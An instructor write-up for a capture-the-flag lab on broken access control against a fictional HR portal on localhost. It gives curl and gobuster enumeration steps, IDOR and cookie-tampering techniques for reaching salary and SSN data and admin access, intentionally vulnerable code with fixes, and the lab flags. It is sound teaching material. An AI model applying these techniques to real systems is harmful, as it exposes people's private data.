# A01: Broken Access Control - Instructor Writeup

**Lab URL:** http://localhost:3001  
**Topic:** OWASP Top 10 2025 - A01: Broken Access Control  
**Difficulty:** Easy → Medium → Hard  
**Theme:** TechCorp Global HR System

---

## Overview

This lab teaches students about Broken Access Control vulnerabilities through progressive challenges using a realistic corporate HR portal. Students learn enumeration techniques, IDOR (Insecure Direct Object References) to access PII/salary data, and privilege escalation to gain HR admin access.

### Real-World Impact
- **PII Data Breach:** Unauthorized access to employee SSNs, salaries, performance reviews
- **Insider Trading Risk:** Access to C-suite compensation and stock options
- **Compliance Violations:** GDPR, CCPA violations for unauthorized PII access
- **Privilege Escalation:** Regular employee gaining HR admin privileges

### Learning Objectives
- Understand horizontal and vertical privilege escalation in corporate systems
- Practice API enumeration to discover employee records
- Identify IDOR vulnerabilities exposing sensitive HR data
- Exploit cookie-based authentication to escalate privileges
- Learn proper access control implementation for enterprise systems

---

## EXAMPLE: Getting Started Guide

**URL:** http://localhost:3001/example  
**Purpose:** Practice environment with realistic API calls for discovery

### What Students See
A simple member portal page that displays:
- "My Profile" section (loads member ID 1 via API)
- "Access Control" section (shows current access level)

### Discovery Process
Students should:
1. Open browser DevTools (F12) → Network tab
2. See API calls to:
   - `/api/example/part1/member/1`
   - `/api/example/part3/intercept`
3. Modify these URLs to discover vulnerabilities

### Part 1: API Discovery via DevTools
**Teaching Point:** API endpoints visible in browser DevTools Network tab

**Solution:**
1. Open `/example` and watch Network tab
2. See request to `/api/example/part1/member/1`
3. Try different IDs: `/api/example/part1/member/2`, `/api/example/part1/member/3`
4. Find hidden member at ID 108: `/api/example/part1/member/108`
5. **Flag:** `NSA{D3VT00LS_M4ST3R}`

### Part 2: cURL Command Line
**Teaching Point:** APIs behave differently based on User-Agent header

**Solution:**
```bash
curl http://localhost:3001/api/example/part2/test
```
**Flag:** `NSA{CURL_C0MM4ND3R}`

### Part 3: Parameter Manipulation
**Teaching Point:** Query parameters can be manipulated to change access levels

**Solution:**
1. In DevTools, see request to `/api/example/part3/intercept`
2. Modify URL to `/api/example/part3/intercept?access=manager`
3. **Flag:** `NSA{BURP_1NT3RC3PT0R}`

### Part 4: Sequential Enumeration
**Teaching Point:** Predictable IDs enable complete database enumeration

**Solution:**
```bash
# Manual approach
for i in {100..105}; do
  curl http://localhost:3001/api/example/part4/enumerate/$i
done
```
**Flag:** `NSA{3NUM3R4T10N_PR0}` (at ID 105)

---

## LAB 1: Employee Directory (EASY - API Enumeration)

**URL:** http://localhost:3001/lab1  
**Challenge:** Enumerate employee profiles to discover all users in the organization  
**Vulnerability Type:** IDOR (Insecure Direct Object References) via API Enumeration  

### Vulnerability
Horizontal privilege escalation through unrestricted API access. Any employee can view detailed profiles of any other employee, including sensitive HR data.

### Required Tools
- `gobuster` or `dirbuster` - Directory/API enumeration
- `curl` - HTTP API testing
- Browser DevTools - Request inspection

### Exploitation Steps

1. **Reconnaissance - Discover API Endpoints:**
   ```bash
   # Enumerate hidden endpoints
   gobuster dir -u http://localhost:3001 \
     -w /usr/share/wordlists/dirb/common.txt \
     -t 50
   
   # Discover /api endpoint
   # Then enumerate under /api
   gobuster dir -u http://localhost:3001/api \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
     -t 50
   ```

   **Expected Discoveries:**
   - `/api` → API root with endpoint listing
   - `/api/members` → Member directory info
   - `/api/members/list` → Lists all employee IDs
   - `/api/members/search` → Search functionality
   - `/api/users` → User count and hints

2. **API Pattern Discovery:**
   ```bash
   # Check /api endpoint
   curl http://localhost:3001/api
   
   # Explore members endpoint
   curl http://localhost:3001/api/members
   
   # Get list of all employee IDs
   curl http://localhost:3001/api/members/list
   ```

3. **Enumerate Individual Records:**
   ```bash
   # Test API with sequential IDs
   curl http://localhost:3001/api/members/user/1
   curl http://localhost:3001/api/members/user/2
   curl http://localhost:3001/api/members/user/3
   curl http://localhost:3001/api/members/user/4
   ```

4. **Automated Enumeration:**
   ```bash
   # Enumerate all employees
   for i in {1..5}; do
     echo "=== Employee ID $i ==="
     curl -s http://localhost:3001/api/members/user/$i | jq '.'
     sleep 0.5
   done
   ```

5. **Extract Flag - ID 4 contains the flag:**
   ```bash
   curl -s http://localhost:3001/api/members/user/4 | jq '.flag'
   ```
### Flag
`NSA{F0UND_TH3_US3RS}`

### Expected Output
```json
{
  "id": 4,
  "username": "skumar",
  "email": "sarah.kumar@techcorp.com",
  "role": "manager",
  "membership": "Premium",
  "flag": "NSA{F0UND_TH3_US3RS}",
  "message": "You have successfully enumerated all community members!",
  "stats": {
    "totalMembers": 5,
    "members": 3,
    "instructors": 2
  }
}
```

### Sensitive Data Exposed
- Employee names, usernames, departments
- Email addresses and employee IDs
- Job titles and roles
- Manager and executive information
- Department and security clearance levels

---

## LAB 2: My Profile (MEDIUM - Cookie Manipulation)

**URL:** http://localhost:3001/lab2  
**Challenge:** Access other employees' private profile information including salary and SSN  
**Vulnerability Type:** Cookie-Based Access Control  

### Vulnerability
The application trusts the `userId` cookie provided by the client without server-side session validation. Users can modify their `userId` cookie to access other employees' sensitive data.

### Required Tools
- Browser DevTools (Application/Storage tab)
- `curl` with cookie manipulation

### Exploitation Steps

**Method 1: Using Browser DevTools**

1. **Open Lab 2:**
   ```
   http://localhost:3001/lab2
   ```

2. **Inspect Current Cookies:**
   - Press F12 → Application tab → Cookies
   - Note current cookies:
     - `userId=2` (Maria Rodriguez - your account)
     - `userRole=employee`

3. **View Your Own Profile:**
   - Page automatically loads your profile via `/api/profile`
   - Shows basic info but no salary/SSN

4. **Modify Cookie to Access Other Profiles:**
   - In DevTools Cookies section, change `userId` from `2` to `1`
   - Refresh the page
   - Profile now shows sensitive data for employee ID 1

5. **Try Different Employee IDs:**
   - Change `userId` to `3`, `4`, `5`
   - Each reveals that employee's salary, SSN, performance rating

**Method 2: Using curl**

1. **Access Your Own Profile:**
   ```bash
   curl http://localhost:3001/api/profile \
     -H "Cookie: userId=2; userRole=employee"
   ```

2. **Access Other Profiles:**
   ```bash
   # Access CEO profile (ID 5)
   curl http://localhost:3001/api/profile \
     -H "Cookie: userId=5; userRole=employee"
   
   # Access HR Director (ID 4)
   curl http://localhost:3001/api/profile \
     -H "Cookie: userId=4; userRole=employee"
   ```

3. **Enumerate All Profiles:**
   ```bash
   for i in {1..5}; do
     echo "=== Employee ID $i ==="
     curl -s http://localhost:3001/api/profile \
       -H "Cookie: userId=$i; userRole=employee" | jq '{username, title, salary, ssn, flag}'
     echo ""
   done
   ```

### Flag
`NSA{C00K13_M4N1PUL4T10N}`

### Expected Output
```json
{
  "id": 1,
  "username": "jchen",
  "email": "jennifer.chen@techcorp.com",
  "role": "employee",
  "department": "Engineering",
  "title": "Senior Software Engineer",
  "salary": 145000,
  "ssn": "***-**-4521",
  "performanceRating": 4.2,
  "flag": "NSA{C00K13_M4N1PUL4T10N}",
  "_vuln_note": "Cookie manipulation detected: You modified the userId cookie to access another employee's data!"
}
```

### Sensitive Data Exposed
- Employee salaries
- Social Security Numbers (SSN)
- Performance ratings
- Full employment details

### Vulnerable Code Pattern
```javascript
app.get('/api/profile', (req, res) => {
    // VULNERABLE: Trusts client-provided cookie
    const userIdFromCookie = parseInt(cookies.match(/userId=(\d+)/)?.[1]);
    const user = users.find(u => u.id === userIdFromCookie);
    
    // Returns data based on cookie value!
    res.json(user);
});
```

### Secure Implementation
```javascript
app.get('/api/profile', (req, res) => {
    // Get userId from server-side session, not cookie
    const userId = req.session.userId;
    const user = users.find(u => u.id === userId);
    res.json(user);
});
```

---

## LAB 3: HR Admin Dashboard (HARD - Privilege Escalation)

**URL:** http://localhost:3001/lab3  
**Challenge:** Escalate privileges to access HR administrator dashboard  
**Vulnerability Type:** Missing Function-Level Access Control  

### Vulnerability
The application checks the `userRole` cookie for authorization but doesn't validate it against server-side session data. Users can modify the `userRole` cookie to gain administrative access.

### Required Tools
- Browser DevTools (Application/Storage tab)
- `curl` with cookie manipulation

### Exploitation Steps

**Method 1: Using Browser DevTools**

1. **Open Lab 3:**
   ```
   http://localhost:3001/lab3
   ```

2. **Observe Access Denied:**
   - Page shows "Access Denied" message
   - You are logged in as regular employee

3. **Inspect Cookies:**
   - Press F12 → Application tab → Cookies
   - Note: `userRole=employee` and `userId=2`

4. **Modify userRole Cookie:**
   - Change `userRole` from `employee` to `admin`
   - Refresh the page

5. **Access Granted:**
   - Dashboard now loads with sensitive HR data
   - Flag appears automatically

**Method 2: Using curl**

1. **Attempt Access with Regular Role:**
   ```bash
   curl http://localhost:3001/api/admin/dashboard \
     -H "Cookie: userId=2; userRole=employee"
   ```
   **Result:** Access Denied

2. **Escalate Privileges:**
   ```bash
   curl http://localhost:3001/api/admin/dashboard \
     -H "Cookie: userId=2; userRole=admin" | jq '.'
   ```
   **Result:** Access Granted + Flag

3. **Extract Sensitive Data:**
   ```bash
   curl -s http://localhost:3001/api/admin/dashboard \
     -H "Cookie: userId=2; userRole=admin" | jq '{
       flag,
       employeeStats: .employeeStats,
       sensitiveData: .sensitiveData
     }'
   ```

### Flag
`NSA{PR1V1L3G3_3SC4L4T10N}`

### Expected Output
```json
{
  "message": "Welcome to the HR Admin Dashboard",
  "user": {
    "id": 2,
    "role": "admin"
  },
  "employeeStats": {
    "totalEmployees": 5,
    "avgSalary": 285600,
    "highestPaid": {
      "username": "rceo",
      "salary": 850000
    },
    "departmentCount": {
      "Engineering": 1,
      "Marketing": 1,
      "Sales": 1,
      "HR": 1
    }
  },
  "sensitiveData": {
    "payrollBudget": "$12.5M annually",
    "upcomingLayoffs": "15 positions",
    "executiveBonuses": "$2.1M pool"
  },
  "flag": "NSA{PR1V1L3G3_3SC4L4T10N}",
  "_vuln_note": "Privilege escalation detected: Regular employee manipulated userRole cookie to gain admin access!"
}
```

### Sensitive Data Exposed
- Complete employee statistics and salary data
- Average salaries and highest-paid employees
- Department breakdown and headcount
- Payroll budget information
- Upcoming layoffs and restructuring plans
- Executive bonus pools

### Vulnerable Code Pattern
```javascript
app.get('/api/admin/dashboard', (req, res) => {
    // VULNERABLE: Trusts client-provided userRole cookie
    const userRole = cookies.match(/userRole=([^;]+)/)?.[1] || 'employee';
    
    // Only checks cookie value - easily manipulated!
    if (userRole !== 'admin') {
        return res.status(403).json({ error: 'Access Denied' });
    }
    
    // Returns sensitive admin data
    res.json({ adminData: sensitiveInfo });
});
```

### Secure Implementation
```javascript
app.get('/api/admin/dashboard', (req, res) => {
    // Get user from server-side session
    const userId = req.session.userId;
    const user = users.find(u => u.id === userId);
    
    // Check role from database, not cookie
    if (!user || (user.role !== 'manager' && user.role !== 'executive')) {
        return res.status(403).json({ error: 'Access Denied' });
    }
    
    res.json({ adminData: sensitiveInfo });
});
```

---

## Summary of Vulnerabilities

### Lab 1: IDOR via API Enumeration
- **Type:** Horizontal Privilege Escalation
- **Root Cause:** No access control on API endpoints
- **Impact:** Exposure of all employee records
- **Fix:** Implement per-user access control checks

### Lab 2: Cookie-Based Authorization
- **Type:** Broken Authentication
- **Root Cause:** Trusting client-provided userId cookie
- **Impact:** Access to any employee's sensitive data (salary, SSN)
- **Fix:** Use server-side sessions, never trust client cookies for identity

### Lab 3: Missing Function-Level Access Control
- **Type:** Vertical Privilege Escalation
- **Root Cause:** Trusting client-provided userRole cookie
- **Impact:** Regular employee gaining admin access to HR dashboard
- **Fix:** Validate roles server-side against authenticated session

---

## Common Student Questions

**Q: Why is broken access control #1 on OWASP Top 10?**  
A: It's the most common and impactful vulnerability. 94% of applications tested had some form of broken access control. It allows attackers to access unauthorized data or functionality.

**Q: What's the difference between Lab 1, 2, and 3?**  
A: 
- **Lab 1:** IDOR - accessing other users' data via API enumeration
- **Lab 2:** Cookie manipulation - modifying userId to impersonate others
- **Lab 3:** Privilege escalation - changing userRole to gain admin access

**Q: How do real applications prevent these attacks?**  
A: Through proper authentication, session management, and server-side authorization checks. Never trust client input for access decisions.

**Q: Can we use UUIDs instead of sequential IDs?**  
A: UUIDs help with enumeration but don't solve authorization issues. You still need proper access control checks regardless of ID format.

**Q: Aren't cookies supposed to be httpOnly and secure?**  
A: Yes! Cookies should be httpOnly (prevents JavaScript access) and secure (HTTPS only). But even with these flags, you still shouldn't store sensitive authorization data in cookies - use server-side sessions instead.

---

## Remediation Summary

### Key Takeaways
1. ✅ Always verify authentication AND authorization on the server
2. ✅ Check permissions on EVERY request
3. ✅ Use server-side session data for access decisions
4. ✅ Never trust client-provided IDs or role information
5. ✅ Implement deny-by-default access control
6. ✅ Log and alert on access control failures
7. ✅ Use httpOnly, secure, SameSite cookies
8. ✅ Store only session IDs in cookies, not authorization data

### Prevention Checklist
- [ ] Implement server-side authorization for all resources
- [ ] Use secure session management (server-side sessions)
- [ ] Apply principle of least privilege
- [ ] Deny access by default
- [ ] Validate authorization on every request
- [ ] Don't trust client-provided identity or role data
- [ ] Test access controls with automated tools
- [ ] Log access control failures for monitoring
- [ ] Use UUIDs for non-guessable identifiers
- [ ] Implement rate limiting on API endpoints

---

## Additional Resources
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
- [OWASP Top 10 2021 - A01](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PortSwigger: Access Control](https://portswigger.net/web-security/access-control)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
